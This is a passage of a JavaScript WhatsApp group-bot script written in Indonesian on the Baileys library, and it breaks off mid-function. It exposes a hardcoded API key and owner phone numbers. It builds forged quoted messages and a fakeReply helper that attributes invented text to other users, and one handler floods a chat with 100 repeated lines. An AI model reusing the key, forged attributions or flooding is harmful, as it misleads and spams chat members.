const info_nih_cok =`

Sc ini cuma mau di perbaiki sampai semua fitur work
Abistu boleh beli yg no enc klo ada yg minat 📝

`
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const toMs = require('ms')
const chalk = require("chalk")
const crypto = require('crypto')
const util = require('util');
const speed = require('performance-now')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
//const imgbb = require('imgbb-uploader')
const request = require('request')
const fetch = require('node-fetch')
const path = require('path')
const cd = 4.32e+7
const { spawn, exec, execSync } = require("child_process")
const hx = require('hxz-api')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { webp2mp4File} = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js');
const simple = require('./lib/simple.js')
const { color, bgcolor } = require('./lib/color')
//const translate = require('./lib/translate')
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/aboutuser")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const Exif = require('./lib/exif');
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
			const _off = JSON.parse(fs.readFileSync('./lib/off.json'))
			const exif = new Exif();
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { msgFilter } = require('./lib/antispam')
const premium = require('./lib/premium')
const _sewa = require("./lib/sewa")
const { addVote, delVote } = require('./database/voting/vote')
const afk = require("./lib/afk")
const setTtt = require('./lib/tictactoe.js')
const { yta2, ytv2} = require('./lib/y2mate')
const { yta, ytv, upload } = require('./lib/ytdl')
const menubot = require('./Menu/zeeoneofc.js')
const { wikiSearch } = require('./lib/wiki.js')
const { sewabotkak } = require('./lib/sewabot.js')
const { uploadImages } = require('./lib/uploadimage')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const { addCommands, getJawabanCmd, getSoalCmd, getCommandsPosi, checkCommands, isCreated, deleteCommands } = require('./lib/commands')
const lolkey = '78bd89cd7b4d6205e3e18061' 

			const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
			const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
			const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
			const voting = JSON.parse(fs.readFileSync('./database/voting/voting.json'))
			const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
			const setting = JSON.parse(fs.readFileSync('./settings.json'))
			const _user = JSON.parse(fs.readFileSync('./database/user.json'))
			const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
			const _premium = JSON.parse(fs.readFileSync('./database/premium.json'))
			const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
			const _level = JSON.parse(fs.readFileSync('./database/level.json'))
			const _afk = JSON.parse(fs.readFileSync('./database/afk.json'))
			const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
			const atro = JSON.parse(fs.readFileSync('./database/ATO.json'))
			const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
			const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
			const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
			const audionye = JSON.parse(fs.readFileSync('./database/audio.json'))
			const imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
			const videonye = JSON.parse(fs.readFileSync('./database/video.json'))
			const badword = JSON.parse(fs.readFileSync('./database/badword.json'));
			const grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
			const senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
			let cmdDB = JSON.parse(fs.readFileSync('./database/commands.json'))
			const scommand = JSON.parse(fs.readFileSync('./database/scommand.json')) 
			const imagebb = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"

let single = false
let prefa = setting.prefix
let offline = false
let antitrol = true 

let hit_today = []
let blocked = []
let limitawal = "100" 
let namabot = setting.botname
let owner_name = setting.ownername
let owner_number = setting.ownerNumber
let gamewaktu = "3" 
let numbernye = "0" 
let simbolnya = "•"
let petik = '```'
let enter = '\n'
let notnot = `NOTE:${enter}Jika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w`
let url_gif = setting.url_gif
let public_mode = setting. public_mode
let mlistmsg = false 
let multiprefix = true 
let nopref = false
let autovn = false
let ngetik = false
let menusimple = false
let Mloc = false
let autoregister = setting.user_register
let autorespon = setting.autorespon
let thumbnail = fs.readFileSync(`./image/${setting.thumbnail}`)
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
let winawal = 1 
let loseawal = 1 
let memberwin = 1 
let memberlose = 1 
alasan = '-'
//=================================================//
module.exports = Zeeone = async (Zeeone, Ofc) => {
	try {
        if (!Ofc.hasNewMessage) return
        Ofc = Ofc.messages.all()[0]
        if (!Ofc.message) return
		if (Ofc.key && Ofc.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(Zeeone, Ofc)
		let { mentioned } = m
		bail = m.isBaileys
        Ofc.message = (Object.keys(Ofc.message)[0] === 'ephemeralMessage') ? Ofc.message.ephemeralMessage.message : Ofc.message
        const content = JSON.stringify(Ofc.message)
		const from = Ofc.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(Ofc.message)[0]
        const addCmd = (id, command) => {
			const obj = { id: id, chats: command }
			scommand.push(obj)
			fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
			}
			const getCommandPosition = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return position
				}
			}
			const getCmd = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return scommand[position].chats
				}
			}
			const checkSCommand = (id) => {
				let status = false
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						status = true
					}
				})
			return status
		}
        const cmd = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(Ofc.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multiprefix){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ''
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
        		if ((Object.keys(Ofc.message)[0] === 'ephemeralMessage' && JSON.stringify(Ofc.message).includes('EPHEMERAL_SETTING')) && Ofc.message.ephemeralMessage.message.protocolMessage.type === 3) {
						Zeeone.sendMessage(Ofc.key.remoteJid, `Defak ada yg send bug`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `Pasti bocil nih`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `*TANDAI TELAH DI BACA*\n`.repeat(100), MessageType.text)
					}

				
        body = type === "conversation" && Ofc.message.conversation.startsWith(prefix) ? Ofc.message.conversation : type == "imageMessage" && Ofc.message.imageMessage.caption.startsWith(prefix) ? Ofc.message.imageMessage.caption : type == "videoMessage" && Ofc.message.videoMessage.caption.startsWith(prefix) ? Ofc.message.videoMessage.caption : type == "extendedTextMessage" && Ofc.message.extendedTextMessage.text.startsWith(prefix) ? Ofc.message.extendedTextMessage.text : type == "buttonsResponseMessage" && Ofc.message[type].selectedButtonId ? Ofc.message[type].selectedButtonId : type == "stickerMessage" && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== null && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(Ofc.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? Ofc.message.conversation : (type === 'extendedTextMessage') ? Ofc.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'documentMessage') && Ofc.message.documentMessage.caption ? Ofc.message.documentMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
        const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = Zeeone.user.jid
		const botNumberss = Zeeone.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = Ofc.key.fromMe ? Zeeone.user.jid : isGroup ? Ofc.participant : Ofc.key.remoteJid
		let bio_nya = await Zeeone.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumber = [`${owner_number}@s.whatsapp.net`]
		const isOwner = ownerNumber.includes(sender)
		const alphaNumber = [`62887435047326@s.whatsapp.net`, `918156874290@s.whatsapp.net` ]
		const isCreator = alphaNumber.includes(sender)
		try {
					pp_userb = await Zeeone.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
			try {
		hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value}`
		const runti = process.uptime() 
		const runtime2 = `${kyun(runti)}`
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await Zeeone.chats.all()
		const totalgroup = await Zeeone.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await Zeeone.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await Zeeone.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntro = isGroup ? atro.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAfkOn = afk.checkAfkUser(sender, _afk)
		const isVote = isGroup ? voting.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		const isPremium = isOwner || Ofc.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
			
		const isBanned = ban.includes(sender)
		const isBadword = isGroup ? grupbadword.includes(from) : false
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
		const status = `${public_mode ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		const conts = Ofc.key.fromMe ? Zeeone.user.jid : Zeeone.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = Ofc.key.fromMe ? Zeeone.user.name : conts.notify || conts.vname || conts.name || '-'
		const mentionByTag = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const processsTime = (timestamp, now) => {
			return moment.duration(now - moment(timestamp * 1000)).asSeconds()} 
	
const getLevelingXp = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
						if (_level[i].id === sender) {
							position = i
							}
					})
if (position !== false) {
			return _level[position].xp
			}
		}

const getLevelingLevel = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].level
			}
		}

const getLevelingId = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].id
			}
		}

const addLevelingXp = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			_level[position].xp += amount
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
			}
		}

const addLevelingLevel = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
				_level[position].level += amount
						fs.writeFileSync('./database/level.json', JSON.stringify(_level))
					}
			}
function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
const addLevelingId = (sender) => {
	const obj = {id: sender, xp: 0, level: 0}
				_level.push(obj)
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
				}
 const getUserRandomId = () => {
 	return _user[Math.floor(Math.random() * _user.length)].id
 }

const addRegisterUser = (userid, sender, age, bio, time) => {
	const obj = { id: userid, name: sender, age: age, bio: bio, time: time }
	_user.push(obj)
	fs.writeFileSync('./database/user.json', JSON.stringify(_user))
	}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
	}

const cekUser = (sender) => {
	let status = false
	Object.keys(_user).forEach((i) => {
		if (_user[i].id === sender) {
			status = true
			}
			})
			return status
			}
			const isUser = cekUser(sender)
					
                   var date = new Date();
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
		switch(hari) {
			case 0: hari = "Minggu"; break;
			case 1: hari = "Senin"; break;
			case 2: hari = "Selasa"; break;
			case 3: hari = "Rabu"; break;
			case 4: hari = "Kamis"; break;
			case 5: hari = "Jum`at"; break;
			case 6: hari = "Sabtu"; break;
			}
		switch(bulan1) {
			case 0: bulan1 = "Januari"; break;
			case 1: bulan1 = "Februari"; break;
			case 2: bulan1 = "Maret"; break;
			case 3: bulan1 = "April"; break;
			case 4: bulan1 = "Mei"; break;
			case 5: bulan1 = "Juni"; break;
			case 6: bulan1 = "Juli"; break;
			case 7: bulan1 = "Agustus"; break;
			case 8: bulan1 = "September"; break;
			case 9: bulan1 = "Oktober"; break;
			case 10: bulan1 = "November"; break;
			case 11: bulan1 = "Desember"; break;
			}
			var tampilTanggal = "" + hari + ", " + tanggal + ", " + bulan1 + ", " + tahun;
				var tampilWaktu = "" + jam + " Jam , " + menit + " Menit , " + detik + " Detik";
            

			const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
			if(time2 < "23:59:00"){
				var ucapannya = `Night 🌚 ${pushname}`
				}
       	 if(time2 < "19:00:00"){
     		   var ucapannya = `Night 🌚 ${pushname}`
				}
     	   if(time2 < "18:00:00"){
     		   var ucapannya = `Afternoon 🌅 ${pushname}`
				}
      	  if(time2 < "15:00:00"){
     		   var ucapannya = `GoodDay 🌞 ${pushname}`
				}
    	    if(time2 < "11:00:00"){
       		 var ucapannya = `Morning 🌄 ${pushname}`
				}
    	    if(time2 < "05:00:00"){
  		      var ucapannya = `Night 🌚 ${pushname}`
				}
				mess = {
					wait: 'Proses Lord..',
					limit: 'Limit kamu habis lord , Silahkan beli dengan #buylimit <nominal> atau minta gift dari user lain',
					sewabot: ` 「 *SEWA BOT* 」 \n\nBerikut list sewa bot kami

•> 25k / BULAN (PREMIUM)
Isi sendiri

Minat? Pm wa.me/${owner_number}`,
					ban: 'Maaf Lord Nomor Kamu Sudah Di Banned!',
					error: 'Error Lord, Mungkin Lagi Diperbaiki',
					errorLink: 'Link Error Lord',
					succes: '```[ ✓ ]``` Sukses Lord',
					only: {
						personal: 'Only Private Chat Lord',
						admin: 'Khusus Admin Group Lord',
						group: 'Khusus Dalam Grup Lord',
						 prem: 'Khusus User Premium Lord',
						owner: 'Khusus Owner Bot Lord',
						 }
					} 
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumbnail, surface: 200, message: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`,jpegThumbnail: thumbnail}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'caption': `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}` , 'jpegThumbnail': thumbnail}}}}
		const fkontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Lord;Userbot;;\n' + 'FN: SUBSCRIBE YT ZEEONE OFC\n' + 'item1.TEL;waid=62887435047326:+62887435047326\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
		const isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
				}
			function parseMention(text = '') {
				return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
				}
			const reply = (teks) => {
				return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, contextInfo: { mentionedJid: parseMention(teks) }})
				}
			const sendImage = (teks) => {
				Zeeone.sendMessage(from, teks, image, {quoted:Ofc})
				 }
			 function randomNomor(angka){
				 return Math.floor(Math.random() * angka) + 1
				}
			function pickRandom(arr) {
				return arr[Math.floor(Math.random() * arr.length)]
				}
			const nebal = (angka) => {
				return Math.floor(angka)
				}
			const sendMess = (hehe, teks) => {
				Zeeone.sendMessage(hehe, teks, text)
				}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, quoted: Ofc, contextInfo: { "mentionedJid": memberr } })
				}
			const getUserrRandomId = () => {
				return _user[Math.floor(Math.random() * _user.length)].id
				}
				const sendTextWithMentions = (teks, member, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": member } }) : Zeeone.sendMessage(from, teks.trim(), extendedText, { quoted: Ofc, contextInfo: { "mentionedJid": member } })
				} 
			function monospace(string) {
				return '```' + string + '```'
				}   
			const hideTag = async function(from, text){
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, text, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
				}  
			const sendMention = async(from, text, mentioned, quoted = "") => {
				Zeeone.sendMessage(from, text, text, { quoted: quoted, contextInfo: { mentionedJid: [mentioned] } })
				 }
			const hideTagStiker = async(from, buffer) => {
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, buffer, sticker, { sendEphemeral: true, contextInfo: { mentionedJid: ane } })
				}
		const promoteAdmin = async function(to, target=[]){
				if(!target.length > 0) { return  reply("No target..") }
				let g = await Zeeone.groupMetadata(to)
				let owner = g.owner.replace("c.us","s.whatsapp.net")
				let me = Zeeone.user.jid
				for (i of target){
					if (!i.includes(me) && !i.includes(owner)){
						const res = await Zeeone.groupMakeAdmin(to, [i])
						 }else{
							reply("NOT PREMITED")
						}
					}
				}
			const demoteAdmin = async function(to, target=[]){
					if(!target.length > 0) { return  reply("No target..") }
					let g = await Zeeone.groupMetadata(to)
					let owner = g.owner.replace("c.us","s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target){
						if (!i.includes(me) && !i.includes(owner)){
							const res = await Zeeone.groupDemoteAdmin(to, [i])
							} else {
								reply("NOT PREMITED")
							}
						}
					}
			const kickMember = async(id, target = []) => {
					let group = await Zeeone.groupMetadata(id)
					let owner = group.owner.replace("c.us", "s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target) {
						if (!i.includes(me) && !i.includes(owner)) {
							await Zeeone.groupRemove(to, [i])
							} else {
								await Zeeone.sendMessage(id, "Not Premited!", "conversation")
							}
						}
					}
			const kick = function(from, orangnya){
				for (let i of orangnya){
					Zeeone.groupRemove(from, [i])
				}
			}
			const add = function(from, orangnya){
					Zeeone.groupAdd(from, orangnya)
				}
			const sendKontak = (from, nomor, nama, org = "") => {
				const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				Zeeone.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: Ofc})
			}
			const hideTagKontak = async(from, nomor, nama) => {
				vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, { displayname: nama, vcard: vcard }, contact, { contextInfo: { mentionedJid: ane } })
				}
			const sendFileFromStorage = (path, type, options) => {
				Zeeone.sendMessage(from, fs.readFileSync(path), type, options).catch(e => {
					reply('Terjadi kesalahan')
					console.log(e)
				})
			}
			const getGroup = async function(totalchat){
				let grup = []
				let a = []
				let b = []
				for (c of totalchat){
					a.push(c.jid)
				}
				for (d of a){
					if (d && d.includes('g.us')){
						b.push(d)
					}
				}
				for (e of b){
					let ingfo = await Zeeone.groupMetadata(e)
					grup.push(ingfo)
					}
					return grup
				}
				
				const fakeReply = (teks, target, teks2) => {
					Zeeone.sendMessage(from, teks, text, {quoted: {key: {fromMe: false, participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: teks2}}})
				}
				let authorname = Zeeone.contacts[from] != undefined ? Zeeone.contacts[from].vname || Zeeone.contacts[from].notify : undefined	
				if (authorname != undefined) { } else { authorname = groupName }	
					function addMetadata(packname, author) {	
						if (!packname) packname = 'self'; if (!author) author = 'Zeeone';author = author.replace(/[^a-zA-Z0-9]/g, '');	
						let name = `${author}_${packname}`
						if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)
					} else {
						bytes.unshift(0x00)	
					}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
					} else {	
						last = len.toString(16)	
					}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
					return `./sticker/${name}.exif`	
					})	
				}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Zeeone.sendMessage(to, media, MessageType.sticker,{quoted:Ofc})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
